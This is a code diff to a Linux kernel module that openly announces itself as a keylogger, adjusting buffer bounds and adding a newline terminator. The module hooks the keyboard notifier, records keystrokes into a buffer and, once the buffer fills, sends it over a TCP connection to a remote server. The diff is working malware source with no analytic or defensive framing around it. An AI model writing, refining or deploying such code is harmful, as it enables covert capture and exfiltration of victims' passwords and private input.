@@ -103,13 +103,13 @@ int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param)
 		unsigned int keycode = param->value;
 		size_t keymap_size = sizeof(keymap) / sizeof(keymap[0]);
 		if (keycode < keymap_size) { // mapping for that keycode exists
-			if (keyboard_buffer_index < KEYBOARD_BUFFER_SIZE) {
+			if (keyboard_buffer_index < KEYBOARD_BUFFER_SIZE - 1) {
 				keyboard_buffer[keyboard_buffer_index++] = keymap[keycode];
-				if (keyboard_buffer_index == KEYBOARD_BUFFER_SIZE) { // buffer is full
+				if (keyboard_buffer_index == KEYBOARD_BUFFER_SIZE - 1) { // buffer is full
 					tcp_send_to_server(conn_socket, keyboard_buffer, KEYBOARD_BUFFER_SIZE, MSG_DONTWAIT);
 					
 					// clear buffer
-					memset(keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
+					memset(keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE - 1);
 					keyboard_buffer_index = 0;
 				}
 			}
@@ -124,6 +124,7 @@ static struct notifier_block nb = {
 
 // Called when loading the kernel module
 static int __init startup(void) {
+	keyboard_buffer[KEYBOARD_BUFFER_SIZE - 1] = '\n'; // marks the end of the buffer
 	register_keyboard_notifier(&nb);
 	tcp_connection_init();
 	pr_info("Loaded keylogger!\n");
